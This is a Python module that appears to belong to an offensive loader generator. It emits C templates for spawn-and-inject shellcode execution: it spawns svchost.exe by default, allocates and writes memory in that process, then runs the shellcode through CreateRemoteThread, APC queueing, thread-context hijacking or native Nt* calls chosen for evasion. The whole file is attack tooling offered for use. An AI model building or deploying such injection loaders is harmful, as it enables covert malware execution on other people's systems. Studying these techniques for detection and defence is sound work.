from string import Template
from pathlib import Path, PureWindowsPath
import sys
from c.utils.functions import *

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

        self.spawn = 'CreateProcessA'
        if 'spawn' in arguments:
            if arguments['spawn'] in ['CreateProcessA', 'NtCreateUserProcess']:
                self.spawn = arguments['spawn']
            else:
                print('Spawn argument must be CreateProcessA, or NtCreateUserProcess')
                exit(0)

        self.allocation = 'VirtualAllocEx'
        if 'allocation' in arguments:
            if arguments['allocation'] in ['VirtualAllocEx', 'NtAllocateVirtualMemory']:
                self.allocation = arguments['allocation']
            else:
                print('Allocation argument must be VirtualAllocEx, or NtAllocateVirtualMemory')
                exit(0)

        self.write = 'WriteProcessMemory'
        if 'write' in arguments:
            if arguments['write'] in ['WriteProcessMemory', 'NtWriteVirtualMemory']:
                self.write = arguments['write']
            else:
                print('Write argument must be WriteProcessMemory, or NtWriteVirtualMemory')
                exit(0)

        self.protect = 'VirtualProtectEx'
        if 'protect' in arguments:
            if arguments['protect'] in ['VirtualProtectEx', 'NtProtectVirtualMemory']:
                self.protect = arguments['protect']
            else:
                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                exit(0)

        self.execution = 'CreateRemoteThread'
        if 'execution' in arguments:
            if arguments['execution'] in ['CreateRemoteThread', 'QueueUserAPC', 'SetThreadContext', 'NtCreateThreadEx', 'NtQueueApcThread']:
                self.execution = arguments['execution']
            else:
                print('Execution argument must be CreateRemoteThread, QueueUserAPC, SetThreadContext, NtQueueApcThread, or NtCreateThreadEx')
                exit(0)

        if 'wait' in arguments:
            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject', 'None']:
                self.wait = arguments['wait']
            else:
                print('Wait argument must be WaitForSingleObject, NtWaitForSingleObject, or None')
                exit(0)
        else:
            if self.execution in ['NtCreateThreadEx', 'CreateRemoteThread']:
                self.wait = 'WaitForSingleObject'
            else:
                self.wait = 'None'

        self.close = 'CloseHandle'
        if 'close' in arguments:
            if arguments['close'] in ['CloseHandle', 'NtClose']:
                self.close = arguments['close']
            else:
                print('Close argument must be CloseHandle, or NtClose')
                exit(0)

    def imports(self) -> list[str]:
        return ["#include <windows.h>",
                "#include <stdio.h>", 
                "#include <stdlib.h>",
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = ''

        if self.spawn == 'CreateProcessA':
            template += CreateProcessA(self.target)
        elif self.spawn == 'NtCreateUserProcess':
            template += NtCreateUserProcess(self.target)

        if self.allocation == 'VirtualAllocEx':
            template += VirtualAllocEx('buffer', 'hProcess', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')
        elif self.allocation == 'NtAllocateVirtualMemory':
            template += NtAllocateVirtualMemory('buffer', 'hProcess', '{shellcodeSize}', 'MEM_COMMIT | MEM_RESERVE', 'PAGE_READWRITE')

        template += '{transformers}'

        if self.write == 'WriteProcessMemory':
            template += WriteProcessMemory('hProcess', 'buffer', 'shellcode', '{shellcodeSize}')
        elif self.write == 'NtWriteVirtualMemory':
            template += NtWriteVirtualMemory('hProcess', 'buffer', 'shellcode', '{shellcodeSize}')

        if self.protect == 'VirtualProtectEx':
            template += VirtualProtectEx('hProcess', 'buffer', '{shellcodeSize}', self.memoryPermission)
        elif self.protect == 'NtProtectVirtualMemory':
            template += NtProtectVirtualMemory('hProcess', 'buffer', '{shellcodeSize}', self.memoryPermission)

        if self.execution == 'CreateRemoteThread':
            template += CreateRemoteThread('newthread', 'hProcess', 'buffer')
        elif self.execution == 'QueueUserAPC':
            template += QueueUserAPC('buffer', 'hThread')
        elif self.execution == 'SetThreadContext':
            template += GetThreadContext('ctx', 'hThread')
            template += 'ctx.Rip = (DWORD64)buffer;'
            template += SetThreadContext('ctx', 'hThread')
        elif self.execution == 'NtCreateThreadEx':
            template += NtCreateThreadEx('newThread', 'hProcess', 'buffer')
        elif self.execution == 'NtQueueApcThread':
            template += NtQueueApcThread('hThread', 'buffer')

        if self.wait == 'WaitForSingleObject':
            template += WaitForSingleObject('newThread', 500)
        elif self.wait == 'NtWaitForSingleObject':
            template += NtWaitForSingleObject('newThread', 0)
        elif self.wait == 'None':
            template += ResumeThread('hThread')

        if self.close == 'CloseHandle':
            template += CloseHandle('hThread')
            template += CloseHandle('hProcess')
        elif self.close == 'NtClose':
            template += NtClose('hThread')
            template += NtClose('hProcess')

        return template